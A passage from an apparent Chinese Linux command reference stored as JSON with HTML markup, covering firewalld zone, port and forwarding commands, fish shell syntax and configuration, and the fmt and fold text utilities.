<span class=\"hljs-keyword\">disable</span> firewalld <span class=\"hljs-meta\"># 禁用自动启动</span>\nsystemctl status firewalld <span class=\"hljs-meta\"># 或者 firewall-cmd --state 查看状态</span>\n\n<span class=\"hljs-meta\"># 关闭服务的方法</span>\n<span class=\"hljs-meta\"># 你也可以关闭目前还不熟悉的FirewallD防火墙，而使用iptables，命令如下：</span>\n\nsystemctl <span class=\"hljs-keyword\">stop</span> firewalld\nsystemctl <span class=\"hljs-keyword\">disable</span> firewalld\nyum install iptables-services\nsystemctl start iptables\nsystemctl <span class=\"hljs-keyword\">enable</span> iptables\n</code></pre>\n<p>配置firewalld</p>\n<pre><code class=\"language-shell\">firewall-cmd <span class=\"hljs-params\">--version</span>  <span class=\"hljs-comment\"># 查看版本</span>\nfirewall-cmd <span class=\"hljs-params\">--help</span>     <span class=\"hljs-comment\"># 查看帮助</span>\n\n<span class=\"hljs-comment\"># 查看设置：</span>\nfirewall-cmd <span class=\"hljs-params\">--state</span>  <span class=\"hljs-comment\"># 显示状态</span>\nfirewall-cmd <span class=\"hljs-params\">--get-active-zones</span>  <span class=\"hljs-comment\"># 查看区域信息</span>\nfirewall-cmd <span class=\"hljs-params\">--get-zone-of-interface=eth0</span>  <span class=\"hljs-comment\"># 查看指定接口所属区域</span>\nfirewall-cmd <span class=\"hljs-params\">--panic-on</span>  <span class=\"hljs-comment\"># 拒绝所有包</span>\nfirewall-cmd <span class=\"hljs-params\">--panic-off</span>  <span class=\"hljs-comment\"># 取消拒绝状态</span>\nfirewall-cmd <span class=\"hljs-params\">--query-panic</span>  <span class=\"hljs-comment\"># 查看是否拒绝</span>\n\nfirewall-cmd <span class=\"hljs-params\">--reload</span> <span class=\"hljs-comment\"># 更新防火墙规则</span>\nfirewall-cmd <span class=\"hljs-params\">--complete-reload</span>\n<span class=\"hljs-comment\"># 两者的区别就是第一个无需断开连接，就是firewalld特性之一动态添加规则，第二个需要断开连接，类似重启服务</span>\n\n\n<span class=\"hljs-comment\"># 将接口添加到区域，默认接口都在public</span>\nfirewall-cmd <span class=\"hljs-params\">--zone=public</span> <span class=\"hljs-params\">--add-interface=eth0</span>\n<span class=\"hljs-comment\"># 永久生效再加上 --permanent 然后reload防火墙</span>\n \n<span class=\"hljs-comment\"># 设置默认接口区域，立即生效无需重启</span>\nfirewall-cmd <span class=\"hljs-params\">--set-default-zone=public</span>\n\n<span class=\"hljs-comment\"># 查看所有打开的端口：</span>\nfirewall-cmd <span class=\"hljs-params\">--zone=dmz</span> <span class=\"hljs-params\">--list-ports</span>\n\n<span class=\"hljs-comment\"># 加入一个端口到区域：</span>\nfirewall-cmd <span class=\"hljs-params\">--zone=dmz</span> <span class=\"hljs-params\">--add-port=8080/tcp</span>\n<span class=\"hljs-comment\"># 若要永久生效方法同上</span>\n \n<span class=\"hljs-comment\"># 打开一个服务，类似于将端口可视化，服务需要在配置文件中添加，/etc/firewalld 目录下有services文件夹，这个不详细说了，详情参考文档</span>\nfirewall-cmd <span class=\"hljs-params\">--zone=work</span> <span class=\"hljs-params\">--add-service=smtp</span>\n \n<span class=\"hljs-comment\"># 移除服务</span>\nfirewall-cmd <span class=\"hljs-params\">--zone=work</span> <span class=\"hljs-params\">--remove-service=smtp</span>\n\n<span class=\"hljs-comment\"># 显示支持的区域列表</span>\nfirewall-cmd <span class=\"hljs-params\">--get-zones</span>\n\n<span class=\"hljs-comment\"># 设置为家庭区域</span>\nfirewall-cmd <span class=\"hljs-params\">--set-default-zone=home</span>\n\n<span class=\"hljs-comment\"># 查看当前区域</span>\nfirewall-cmd <span class=\"hljs-params\">--get-active-zones</span>\n\n<span class=\"hljs-comment\"># 设置当前区域的接口</span>\nfirewall-cmd <span class=\"hljs-params\">--get-zone-of-interface=enp03s</span>\n\n<span class=\"hljs-comment\"># 显示所有公共区域（public）</span>\nfirewall-cmd <span class=\"hljs-params\">--zone=public</span> <span class=\"hljs-params\">--list-all</span>\n\n<span class=\"hljs-comment\"># 临时修改网络接口（enp0s3）为内部区域（internal）</span>\nfirewall-cmd <span class=\"hljs-params\">--zone=internal</span> <span class=\"hljs-params\">--change-interface=enp03s</span>\n\n<span class=\"hljs-comment\"># 永久修改网络接口enp03s为内部区域（internal）</span>\nfirewall-cmd <span class=\"hljs-params\">--permanent</span> <span class=\"hljs-params\">--zone=internal</span> <span class=\"hljs-params\">--change-interface=enp03s</span>\n</code></pre>\n<p>服务管理</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 显示服务列表  </span>\nAmanda, FTP, Samba和TFTP等最重要的服务已经被FirewallD提供相应的服务，可以使用如下命令查看：\n\nfirewall-cmd --get-services\n\n<span class=\"hljs-comment\"># 允许SSH服务通过</span>\nfirewall-cmd <span class=\"hljs-attribute\">--new-service</span>=ssh\n\n<span class=\"hljs-comment\"># 禁止SSH服务通过</span>\nfirewall-cmd <span class=\"hljs-attribute\">--delete-service</span>=ssh\n\n<span class=\"hljs-comment\"># 打开TCP的8080端口</span>\nfirewall-cmd --<span class=\"hljs-built_in\">enable</span> <span class=\"hljs-attribute\">ports</span>=8080/tcp\n\n<span class=\"hljs-comment\"># 临时允许Samba服务通过600秒</span>\nfirewall-cmd --<span class=\"hljs-built_in\">enable</span> <span class=\"hljs-attribute\">service</span>=samba <span class=\"hljs-attribute\">--timeout</span>=600\n\n<span class=\"hljs-comment\"># 显示当前服务</span>\nfirewall-cmd --list-services\n\n<span class=\"hljs-comment\"># 添加HTTP服务到内部区域（internal）</span>\nfirewall-cmd --permanent <span class=\"hljs-attribute\">--zone</span>=internal <span class=\"hljs-attribute\">--add-service</span>=http\nfirewall-cmd --reload     # 在不改变状态的条件下重新加载防火墙\n</code></pre>\n<p>端口管理</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 打开443/TCP端口</span>\nfirewall-cmd <span class=\"hljs-params\">--add-port=443/tcp</span>\n\n<span class=\"hljs-comment\"># 永久打开3690/TCP端口</span>\nfirewall-cmd <span class=\"hljs-params\">--permanent</span> <span class=\"hljs-params\">--add-port=3690/tcp</span>\n\n<span class=\"hljs-comment\"># 永久打开端口好像需要reload一下，临时打开好像不用，如果用了reload临时打开的端口就失效了</span>\n<span class=\"hljs-comment\"># 其它服务也可能是这样的，这个没有测试</span>\nfirewall-cmd <span class=\"hljs-params\">--reload</span>\n\n<span class=\"hljs-comment\"># 查看防火墙，添加的端口也可以看到</span>\nfirewall-cmd <span class=\"hljs-params\">--list-all</span>\n</code></pre>\n<p>直接模式</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># FirewallD包括一种直接模式，使用它可以完成一些工作，例如打开TCP协议的9999端口</span>\n\nfirewall-cmd <span class=\"hljs-params\">--direct</span> -add-rule ipv4 filter INPUT 0 -p tcp <span class=\"hljs-params\">--dport</span> 9000 -j ACCEPT\nfirewall-cmd <span class=\"hljs-params\">--reload</span>\n</code></pre>\n<p><strong>自定义服务管理</strong></p>\n<p>选项</p>\n<pre><code class=\"language-shell\">（末尾带有 [P only] 的话表示该选项除了与（--permanent）之外，不能与其他选项一同使用！）\n<span class=\"hljs-attribute\">--new-service</span>=&lt;服务名&gt; 新建一个自定义服务 [P only]\n<span class=\"hljs-attribute\">--new-service-from-file</span>=&lt;文件名&gt; [<span class=\"hljs-attribute\">--name</span>=&lt;服务名&gt;]\n                      从文件中读取配置用以新建一个自定义服务 [P only]\n<span class=\"hljs-attribute\">--delete-service</span>=&lt;服务名&gt;\n                      删除一个已存在的服务 [P only]\n<span class=\"hljs-attribute\">--load-service-defaults</span>=&lt;服务名&gt;\n                      Load icmptype<span class=\"hljs-built_in\"> default settings </span>[P only]\n<span class=\"hljs-attribute\">--info-service</span>=&lt;服务名&gt;\n                      显示该服务的相关信息\n<span class=\"hljs-attribute\">--path-service</span>=&lt;服务名&gt;\n                      显示该服务的文件的相关路径 [P only]\n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--set-description</span>=&lt;描述&gt;\n                      给该服务设置描述信息 [P only]\n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; --get-description\n                      显示该服务的描述信息 [P only]\n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--set-short</span>=&lt;描述&gt;\n                      给该服务设置一个简短的描述 [P only]\n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; --get-short\n                      显示该服务的简短描述 [P only]\n                      \n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--add-port</span>=&lt;端口号&gt;[-&lt;端口号&gt;]/&lt;protocol&gt;\n                      给该服务添加一个新的端口(端口段) [P only]\n                      \n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--remove-port</span>=&lt;端口号&gt;[-&lt;端口号&gt;]/&lt;protocol&gt;\n                      从该服务上移除一个端口(端口段) [P only]\n                      \n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--query-port</span>=&lt;端口号&gt;[-&lt;端口号&gt;]/&lt;protocol&gt;\n                      查询该服务是否添加了某个端口(端口段) [P only]\n                      \n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; --get-ports\n                      显示该服务添加的所有端口 [P only]\n                      \n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--add-protocol</span>=&lt;protocol&gt;\n                      为该服务添加一个协议 [P only]\n                      \n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--remove-protocol</span>=&lt;protocol&gt;\n                      从该服务上移除一个协议 [P only]\n                      \n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--query-protocol</span>=&lt;protocol&gt;\n                      查询该服务是否添加了某个协议 [P only]\n                      \n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; --get-protocols\n                      显示该服务添加的所有协议 [P only]\n                      \n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--add-source-port</span>=&lt;端口号&gt;[-&lt;端口号&gt;]/&lt;protocol&gt;\n                      添加新的源端口(端口段)到该服务 [P only]\n                      \n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--remove-source-port</span>=&lt;端口号&gt;[-&lt;端口号&gt;]/&lt;protocol&gt;\n                      从该服务中删除源端口(端口段) [P only]\n                      \n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--query-source-port</span>=&lt;端口号&gt;[-&lt;端口号&gt;]/&lt;protocol&gt;\n                      查询该服务是否添加了某个源端口(端口段) [P only]\n                      \n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; --get-source-ports\n                      显示该服务所有源端口 [P only]\n                      \n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--add-module</span>=&lt;module&gt;\n                      为该服务添加一个模块 [P only]\n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--remove-module</span>=&lt;module&gt;\n                      为该服务移除一个模块 [P only]\n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--query-module</span>=&lt;module&gt;\n                      查询该服务是否添加了某个模块 [P only]\n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; --get-modules\n                      显示该服务添加的所有模块 [P only]\n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--set-destination</span>=&lt;ipv&gt;:&lt;address&gt;[/&lt;mask&gt;]\n                      <span class=\"hljs-built_in\">Set</span> destination <span class=\"hljs-keyword\">for</span> ipv <span class=\"hljs-keyword\">to</span><span class=\"hljs-built_in\"> address </span><span class=\"hljs-keyword\">in</span><span class=\"hljs-built_in\"> service </span>[P only]\n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--remove-destination</span>=&lt;ipv&gt;\n                      <span class=\"hljs-built_in\">Disable</span> destination <span class=\"hljs-keyword\">for</span> ipv i<span class=\"hljs-built_in\"> service </span>[P only]\n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; <span class=\"hljs-attribute\">--query-destination</span>=&lt;ipv&gt;:&lt;address&gt;[/&lt;mask&gt;]\n                      Return whether destination ipv is <span class=\"hljs-built_in\">set</span> <span class=\"hljs-keyword\">for</span><span class=\"hljs-built_in\"> service </span>[P only]\n<span class=\"hljs-attribute\">--service</span>=&lt;服务名&gt; --get-destinations\n                      List destinations <span class=\"hljs-keyword\">in</span><span class=\"hljs-built_in\"> service </span>[P only]\n</code></pre>\n<p><strong>控制端口 / 服务</strong></p>\n<p>可以通过两种方式控制端口的开放，一种是指定端口号另一种是指定服务名。虽然开放 http 服务就是开放了 80 端口，但是还是不能通过端口号来关闭，也就是说通过指定服务名开放的就要通过指定服务名关闭；通过指定端口号开放的就要通过指定端口号关闭。还有一个要注意的就是指定端口的时候一定要指定是什么协议，tcp 还是 udp。知道这个之后以后就不用每次先关防火墙了，可以让防火墙真正的生效。</p>\n<pre><code class=\"language-shell\">firewall-<span class=\"hljs-keyword\">cmd</span><span class=\"language-bash\"> --add-service=mysql        <span class=\"hljs-comment\"># 开放mysql端口</span></span>\nfirewall-<span class=\"hljs-keyword\">cmd</span><span class=\"language-bash\"> --remove-service=http      <span class=\"hljs-comment\"># 阻止http端口</span></span>\nfirewall-<span class=\"hljs-keyword\">cmd</span><span class=\"language-bash\"> --list-services            <span class=\"hljs-comment\"># 查看开放的服务</span></span>\nfirewall-<span class=\"hljs-keyword\">cmd</span><span class=\"language-bash\"> --add-port=3306/tcp        <span class=\"hljs-comment\"># 开放通过tcp访问3306</span></span>\nfirewall-<span class=\"hljs-keyword\">cmd</span><span class=\"language-bash\"> --remove-port=80tcp        <span class=\"hljs-comment\"># 阻止通过tcp访问3306</span></span>\nfirewall-<span class=\"hljs-keyword\">cmd</span><span class=\"language-bash\"> --add-port=233/udp         <span class=\"hljs-comment\"># 开放通过udp访问233</span></span>\nfirewall-<span class=\"hljs-keyword\">cmd</span><span class=\"language-bash\"> --list-ports               <span class=\"hljs-comment\"># 查看开放的端口</span></span>\n</code></pre>\n<p>伪装 IP</p>\n<pre><code class=\"language-shell\">firewall-<span class=\"hljs-keyword\">cmd</span><span class=\"language-bash\"> --query-masquerade <span class=\"hljs-comment\"># 检查是否允许伪装IP</span></span>\nfirewall-<span class=\"hljs-keyword\">cmd</span><span class=\"language-bash\"> --add-masquerade   <span class=\"hljs-comment\"># 允许防火墙伪装IP</span></span>\nfirewall-<span class=\"hljs-keyword\">cmd</span><span class=\"language-bash\"> --remove-masquerade<span class=\"hljs-comment\"># 禁止防火墙伪装IP</span></span>\n</code></pre>\n<p><strong>端口转发</strong></p>\n<p>端口转发可以将指定地址访问指定的端口时，将流量转发至指定地址的指定端口。转发的目的如果不指定 ip 的话就默认为本机，如果指定了 ip 却没指定端口，则默认使用来源端口。\n如果配置好端口转发之后不能用，可以检查下面两个问题：</p>\n<ol>\n<li>比如我将 80 端口转发至 8080 端口，首先检查本地的 80 端口和目标的 8080 端口是否开放监听了</li>\n<li>其次检查是否允许伪装 IP，没允许的话要开启伪装 IP</li>\n</ol>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">firewall</span>-cmd --add-forward-port=port=<span class=\"hljs-number\">80</span>:proto=tcp:toport=<span class=\"hljs-number\">8080</span>   # 将<span class=\"hljs-number\">80</span>端口的流量转发至<span class=\"hljs-number\">8080</span>\n<span class=\"hljs-attribute\">firewall</span>-cmd --add-forward-port=port=<span class=\"hljs-number\">80</span>:proto=tcp:toaddr=<span class=\"hljs-number\">192.168.0.1</span> # 将<span class=\"hljs-number\">80</span>端口的流量转发至<span class=\"hljs-number\">192.168.0.1</span>\n<span class=\"hljs-attribute\">firewall</span>-cmd --add-forward-port=port=<span class=\"hljs-number\">80</span>:proto=tcp:toaddr=<span class=\"hljs-number\">192.168.0.1</span>:toport=<span class=\"hljs-number\">8080</span> # 将<span class=\"hljs-number\">80</span>端口的流量转发至<span class=\"hljs-number\">192.168.0.1</span>的<span class=\"hljs-number\">8080</span>端口\n</code></pre>\n<ol>\n<li>当我们想把某个端口隐藏起来的时候，就可以在防火墙上阻止那个端口访问，然后再开一个不规则的端口，之后配置防火墙的端口转发，将流量转发过去。</li>\n<li>端口转发还可以做流量分发，一个防火墙拖着好多台运行着不同服务的机器，然后用防火墙将不同端口的流量转发至不同机器。</li>\n</ol>\n"
    },
    {
        "title": "fishshell",
        "des": "比 bash 更好用的 shell",
        "body": "<h1 id=\"fishshell\">fishshell</h1>\n<p>比 bash 更好用的 shell</p>\n<h2 id=\"安装\">安装</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># Ubuntu 和 Debian 的安装方法。</span>\nsudo apt-get <span class=\"hljs-keyword\">install </span>fish\n<span class=\"hljs-comment\"># Mac 的安装方法。</span>\n<span class=\"hljs-keyword\">brew </span><span class=\"hljs-keyword\">install </span>fish\n</code></pre>\n<h2 id=\"启动与帮助\">启动与帮助</h2>\n<p>由于 <code>Fish</code> 的语法与 <code>Bash</code> 有很大差异，<code>Bash</code> 脚本一般不兼容。因此，建议不要将 <code>Fish</code> 设为默认 <code>Shell</code>，而是每次手动启动它。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># </span><span class=\"language-bash\">安装完成后，就可以启动 Fish。</span>\n<span class=\"hljs-meta\">$ </span><span class=\"language-bash\">fish</span>\n<span class=\"hljs-meta\"># </span><span class=\"language-bash\">使用过程中，如果需要帮助，可以输入 <span class=\"hljs-built_in\">help</span> 命令</span>\n<span class=\"hljs-meta\">$ </span><span class=\"language-bash\"><span class=\"hljs-built_in\">help</span></span>\n</code></pre>\n<h2 id=\"彩色显示\">彩色显示</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 无效命令为红色</span>\n<span class=\"hljs-variable\">$</span> mkd\n<span class=\"hljs-comment\"># 有效命令为蓝色</span>\n<span class=\"hljs-variable\">$</span> mkdir\n<span class=\"hljs-comment\"># 有效路径会有下划线。如果没有下划线，你就知道这个路径不存在。</span>\n<span class=\"hljs-variable\">$</span> <span class=\"hljs-built_in\">cat</span> ~/somefi \n</code></pre>\n<h2 id=\"自动建议\">自动建议</h2>\n<p>Fish 会自动在光标后面给出建议，表示可能的选项，颜色为灰色。如果采纳建议，可以按下 <code>→</code> 或 <code>Control + F</code> 。如果只采纳一部分，可以按下 <code>Alt + →</code>。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$ </span>/bin/hostname <span class=\"hljs-comment\"># 命令建议</span>\n<span class=\"hljs-variable\">$ </span>grep --ignore-<span class=\"hljs-keyword\">case</span> <span class=\"hljs-comment\"># 参数建议</span>\n<span class=\"hljs-variable\">$ </span>ls node_modules <span class=\"hljs-comment\"># 路径建议</span>\n</code></pre>\n<h2 id=\"自动补全\">自动补全</h2>\n<p>输入命令时，<code>Fish</code> 会自动显示匹配的上一条历史记录。如果没有匹配的历史记录，<code>Fish</code> 会猜测可能的结果，自动补全各种输入。比如，输入 <code>pyt</code> 再按下 <code>Tab</code> ，就会自动补全为 <code>python</code> 命令。</p>\n<p><code>Fish</code> 还可以自动补全 <code>Git</code> 分支。</p>\n<h2 id=\"脚本语法\">脚本语法</h2>\n<h3 id=\"if-语句\">if 语句</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">grep</span> fish <span class=\"hljs-regexp\">/etc/</span>shells\n    echo Found fish\n<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">grep</span> bash <span class=\"hljs-regexp\">/etc/</span>shells\n    echo Found bash\n<span class=\"hljs-keyword\">else</span>\n    echo Got nothing\nend\n</code></pre>\n<h3 id=\"switch-语句\">switch 语句</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">switch</span> (uname)\n<span class=\"hljs-keyword\">case</span> Linux\n    <span class=\"hljs-keyword\">echo</span> Hi Tux!\n<span class=\"hljs-keyword\">case</span> Darwin\n    <span class=\"hljs-keyword\">echo</span> Hi Hexley!\n<span class=\"hljs-keyword\">case</span> FreeBSD NetBSD DragonFly\n    <span class=\"hljs-keyword\">echo</span> Hi Beastie!\n<span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'*'</span>\n    <span class=\"hljs-keyword\">echo</span> Hi, stranger!\nend\n</code></pre>\n<h3 id=\"while-循环\">while 循环</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">while</span> <span class=\"hljs-literal\">true</span>\n    echo <span class=\"hljs-string\">\"Loop forever\"</span>\n<span class=\"hljs-keyword\">end</span>\n</code></pre>\n<h3 id=\"for-循环\">for 循环</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">file</span> in *.txt\n    cp <span class=\"hljs-symbol\">$</span><span class=\"hljs-keyword\">file</span> <span class=\"hljs-symbol\">$</span><span class=\"hljs-keyword\">file</span>.bak\nend\n</code></pre>\n<h3 id=\"函数\">函数</h3>\n<p><code>Fish</code> 的函数用来封装命令，或者为现有的命令起别名。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">ll</span></span>\n    <span class=\"hljs-built_in\">ls</span> <span class=\"hljs-literal\">-lhG</span> <span class=\"hljs-variable\">$argv</span>\n<span class=\"hljs-keyword\">end</span>\n</code></pre>\n<p>上面代码定义了一个 <code>ll</code> 函数。命令行执行这个函数以后，就可以用 <code>ll</code> 命令替代 <code>ls -lhG</code>。其中，变量 <code>$argv</code> 表示函数的参数。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">function</span> ls\n    <span class=\"hljs-built_in\">command</span> ls -hG <span class=\"hljs-variable\">$argv</span>\nend\n</code></pre>\n<p>上面的代码重新定义 <code>ls</code> 命令。注意，函数体内的 <code>ls</code> 之前，要加上 <code>command</code>，否则会因为无限循环而报错。</p>\n<h3 id=\"提示符\">提示符</h3>\n<p><code>fish_prompt</code> 函数用于定义命令行提示符（prompt）。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">fish_prompt</span></span>\n  set_color purple\n  <span class=\"hljs-built_in\">date</span> <span class=\"hljs-string\">\"+%m/%d/%y\"</span>\n  set_color FF0\n  echo (pwd) <span class=\"hljs-string\">'&gt;'</span>\n  set_color <span class=\"hljs-keyword\">normal</span>\n<span class=\"hljs-keyword\">end</span>\n</code></pre>\n<p>执行上面的函数以后，你的命令行提示符就会变成下面这样。</p>\n<pre><code><span class=\"hljs-number\">02</span><span class=\"hljs-regexp\">/06/</span><span class=\"hljs-number\">13</span>\n<span class=\"hljs-regexp\">/home/</span>tutorial &gt; \n</code></pre>\n<h2 id=\"配置\">配置</h2>\n<p>Fish 的配置文件是 <code>~/.config/fish/config.fish</code>，每次 <code>Fish</code> 启动，就会自动加载这个文件。Fish 还提供 Web 界面配置该文件。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">$ </span>fish_config <span class=\"hljs-comment\"># 浏览器打开 Web 界面配置</span>\n</code></pre>\n<p>Running Commands: 兼容 bash 等shell的命令执行方式<br>Getting Help: <code>help/man cmd -&gt; browser/terminal</code><br>Syntax Highlighting: 实时检查命令是否正确<br>Wildcards: 支持缩写  <code>*</code> 递归 匹配<br>Pipes and Redirections: 使用 <code>^</code> 代表 stderr<br>Autosuggestions: 自动建议, 可以使用 <code>Ctrl-f / -&gt;</code> 来补全<br>Tab Completions: 更强大的 tab 补全<br>Variables: 使用 set 设置<br>Exit Status: 使用 <code>echo $status</code> 替代 <code>$?</code><br>Exports (Shell Variables)<br>Lists: all variables in fish are really lists<br>Command Substitutions: 使用 <code>(cmd)</code> 来执行命令, 而不是 反引号、<code>$()</code><br>Combiners (And, Or, Not): 不支持使用符合来表示逻辑运算<br>Functions：使用 <code>$argv</code> 替代 <code>$1</code><br>Conditionals (If, Else, Switch) / Functions / Loops: 更人性化的写法(参考 py)<br>Prompt: <code>function fish_prompt</code> 实现<br>Startup (Where's .bashrc?): <code>~/.config/fish/config.fish</code>，更好的方式是 autoloading-function、universal-variables<br>Autoloading Functions: <code> ~/.config/fish/functions/.</code><br>Universal Variables：a variable whose value is shared across all instances of fish  </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">set</span> name <span class=\"hljs-string\">'czl'</span> <span class=\"hljs-comment\"># 设置变量，替代 name=czl</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$name</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$status</span> <span class=\"hljs-comment\"># exit status，替代 $?</span>\nenv <span class=\"hljs-comment\"># 环境变量</span>\n<span class=\"hljs-built_in\">set</span> -x MyVariable SomeValue <span class=\"hljs-comment\"># 替代 export</span>\n<span class=\"hljs-built_in\">set</span> -e MyVariable\n<span class=\"hljs-built_in\">set</span> PATH <span class=\"hljs-variable\">$PATH</span> /usr/<span class=\"hljs-built_in\">local</span>/bin <span class=\"hljs-comment\"># 使用 lists 记录 PATH</span>\n<span class=\"hljs-built_in\">set</span> -U fish_user_paths /usr/<span class=\"hljs-built_in\">local</span>/bin <span class=\"hljs-variable\">$fish_user_paths</span> <span class=\"hljs-comment\"># 永久生效</span>\ntouch <span class=\"hljs-string\">\"testing_\"</span>(date +%s)<span class=\"hljs-string\">\".txt\"</span> <span class=\"hljs-comment\"># command subtitution，替代 `date +%s`</span>\ncp file.txt file.txt.bak; and <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'back success'</span>; or <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'back fail'</span> <span class=\"hljs-comment\"># combiner</span>\n<span class=\"hljs-built_in\">functions</span> <span class=\"hljs-comment\"># 列出 fish 下定义的函数</span>\n</code></pre>\n<h2 id=\"参考资料\">参考资料</h2>\n<ul>\n<li><a href=\"http://fishshell.com\">fish-shell官网</a></li>\n</ul>\n"
    },
    {
        "title": "fmt",
        "des": "读取文件后优化处理并输出",
        "body": "<h1 id=\"fmt\">fmt</h1>\n<p>读取文件后优化处理并输出</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>fmt命令</strong> 读取文件的内容，根据选项的设置对文件格式进行简单的优化处理，并将结果送到标准输出设备。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">fmt</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c或--crown-margin：每段前两列缩排；</span>\n<span class=\"hljs-deletion\">-p&lt;列起始字符串&gt;或-prefix=&lt;列起始字符串&gt;：仅合并含有指定字符串的列，通常运用在程序语言的注解方面；</span>\n<span class=\"hljs-deletion\">-s或--split-only：只拆开字数超出每列字符数的列，但不合并字数不足每列字符数的列；</span>\n<span class=\"hljs-deletion\">-t或--tagged-paragraph：每列前两列缩排，但第1列和第2列的缩排格式不同；</span>\n<span class=\"hljs-deletion\">-u或--uniform-spacing：每列字符之间都以一个空格字符间隔，每个句子之间则两个空格字符分隔；</span>\n<span class=\"hljs-deletion\">-w&lt;每列字符数&gt;或--width=&lt;每列字符数&gt;或-&lt;每列字符数&gt;：设置每列的最大字符数。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>指定要优化格式的文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "fold",
        "des": "控制文件内容输出时所占用的屏幕宽度",
        "body": "<h1 id=\"fold\">fold</h1>\n<p>控制文件内容输出时所占用的屏幕宽度</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>fold命令</strong> 用于控制文件内容输出时所占用的屏幕宽度。fold命令会从指定的文件里读取内容，将超过限定列宽的列加入增列字符后，输出到标准输出设备。若不指定任何文件名称，或是所给予的文件名为“-”，则fold指令会从标准输入设备读取数据。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">fold</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b或——bytes：以Byte为单位计算列宽，而非采用行数编号为单位；</span>\n<span class=\"hljs-deletion\">-s或——spaces：以空格字符作为换列点；</span>\n<span class=\"hljs-deletion\">-w&lt;每列行数&gt;或--width&lt;每列行数&gt;：设置每列的最大行数。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要显示内容的文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "fping",
        "des": "fping检测主机是否存在",
